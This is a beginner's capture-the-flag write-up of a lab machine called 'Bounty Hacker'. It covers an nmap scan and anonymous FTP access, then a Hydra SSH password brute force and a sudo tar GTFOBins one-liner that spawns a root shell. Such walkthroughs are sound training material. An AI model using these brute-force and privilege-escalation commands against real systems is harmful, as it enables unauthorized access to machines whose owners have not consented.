# Room: Bounty Hacker

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Deply the machine:

No answer needed.

# Recon

First things first... Recon. 

## Find open ports on the machine:

No answer needed. 

### Nmap scan:

The first thing I do is scan the network to get an idea of the ports that are open on the machine.  
NOTE: Normally I also add a -oN tag to save the scan results into a file in my working directory, but I skipped it this time.

`nmap -sT -sC 10.67.182.209`

```
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.67.120.70
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

```
Since I can see that FTP is running on port 21, with anonymous access, that is the first place I will start.

Logging into FTP I see two files: locks.txt, and task.txt. Let's go ahead and grab those.

```
root@ip-10-67-109-61:~# ftp 10.67.182.209
Connected to 10.67.182.209.
220 (vsFTPd 3.0.5)
Name (10.67.182.209:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (312.3207 kB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (109.9441 kB/s)
ftp> !

```

After looking at the files we get some pretty good information. And some answers for the rooms.

#### task.txt

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-*** (Answer to who wrote the task list)
```

The other file, locks.txt, looks like potential passwords. Maybe we can use that for a brute force??

# Enumeration

Now for the fun part. Thinking back to our Nmap scan from before, port 80 was open running an HTML site on it. Maybe that could be of some use? 

Let's spool up gobuster (or any other directrory scanning tool you prefer) and take a look.

## Gobuster

`gobuster dir -u http://10.67.182.209 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.182.209
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.67.182.209/images/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================
```

Okay so maybe there isn't anything worth looking into here... Let's move on to port 22.

## Hydra

Now for a very fun tool. Hydra. We can use Hydra to bruteforce the password on a certain port that is using a protocol that is the answer for a certain question.

`hydra -l lin -P locks.txt ssh://10.67.182.209`

In the command above, we use the username that we got from the task file and the password list that is locks.txt. Now we attack SSH and see if there is a match.

`[22][ssh] host: 10.67.182.209   login: lin   password: ************** (This is the answer to another question so I had to hide it.)`

It appears we got a match. Let's get logged in!

```
lin@ip-10-67-182-209:~/Desktop$ ls
user.txt
```

And there is the user flag!

# Privilege Escalation

Now we just have to look for the root flag. Let's see what steps we can take to get root.

```
lin@ip-10-67-182-209:/$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-67-182-209:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-67-182-209:
    (root) /bin/tar
```

We can see here that lin can use 'tar' as root. Let's make that work to our advantage. To GTFO bins!!

`tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

According to GTFOBins, running the command above with sudo should allow us to escalate to root. Let's try it! 

```
# whoami
root
```

And there we go! We are root! Now you just have to find the root flag, but that is easy since we are root and the flag is in the root directory.

# Room Completed!

Congrats on completing the room! I hope this write up helped you if you got stuck at all! This was my first write up so I hope it made any sense at all. Thank you for reading.

##### See you, space H4ck3r.